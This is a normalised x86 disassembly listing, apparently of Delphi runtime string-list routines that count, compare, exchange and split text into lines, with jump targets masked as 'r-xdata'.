retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_4192c8
push eax
mov eax [ ebp - 0x4 ]
call sub_419120
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_4191ec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419246
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418638
call sub_403270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_419260
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_418550
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_4192a0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4192c8
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_4192dc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41938a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4031c0
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_40424c
mov eax ebx
mov si 0xffff
call sub_40346c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419391
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov eax ebx
mov si 0xffff
call sub_40346c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40346c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4193a4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_404368
sub_4193a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_40403c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_40346c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
call sub_4145bc
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4194a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
mov edx [ ebp - 0xc ]
call sub_4147c0
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402714
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414844
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_40424c
sub_4194c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4033fc
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4183f4
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_4191dc
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418e40
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_4184dc
sub_419528
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418638
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4186ec
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418440
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_418e40
mov eax ebx
call sub_4191dc
pop edi
pop esi
pop ebx
retn
sub_41958c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_4195b0
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a108
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4195e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419604
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419628
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4196cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419778
xor eax eax
push ebp
push sub_4196b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196b9
mov eax [ ebp - 0x4 ]
call sub_419834
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4196e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418b4c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419778
xor eax eax
push ebp
push sub_419760
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419834
retn
sub_419790
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419848
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4197e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_419fa0
mov eax [ ebp - 0x8 ]
push eax
push sub_41a250
push ebp
call sub_419790
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419848
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4198dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4198e4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40400c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4043f4
jne r-xdata
sub_4198f4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4198f0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
jmp sub_403a24
sub_41992c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419974
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d6c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4198f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41997b
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_419984
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419a5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419778
xor eax eax
push ebp
push sub_419a3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a41
mov eax [ ebp - 0x4 ]
call sub_419834
retn
sub_419a78
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419abd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4044a8
call sub_4088ec
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ac4
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_419acc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419bd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404080
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_4040d8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bde
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40400c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4042a8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4042a8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4042a8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028f0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028f0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4042a8
mov ebx eax
test ebx ebx
je r-xdata
sub_419bf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419c6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c73
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_419c80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419d43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404508
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a2e0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041d0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c314
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d4a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_419d54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_419d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419db8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ae1c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e00
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e07
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_419e0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419ea9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419778
xor eax eax
push ebp
push sub_419e8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41a968
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_4040d8
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e93
mov eax [ ebp - 0x4 ]
call sub_419834
retn
sub_419eb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f59
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f60
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
call sub_419778
xor eax eax
push ebp
push sub_419f3c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419834
retn
sub_419f68
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419fa0
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a044
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41cba8
mov eax [ ebp - 0x4 ]
call sub_419778
xor eax eax
push ebp
push sub_41a01f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41bc44
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d848
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a026
mov eax [ ebp - 0x4 ]
call sub_419834
retn
sub_41a050
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ae1c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a09b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0a2
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_41a0a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a0f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4042a8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41abcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0fc
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41a108
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4058c0
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a13c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a17f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4041e0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a186
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41a18c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a240
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419778
xor edx edx
push ebp
push sub_41a223
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a22a
mov eax [ ebp - 0x4 ]
call sub_419834
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040d8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a250
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a2c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41edb4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41edbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2cd
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420518
inc esi
dec ebx
jne r-xdata
sub_41a2f8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
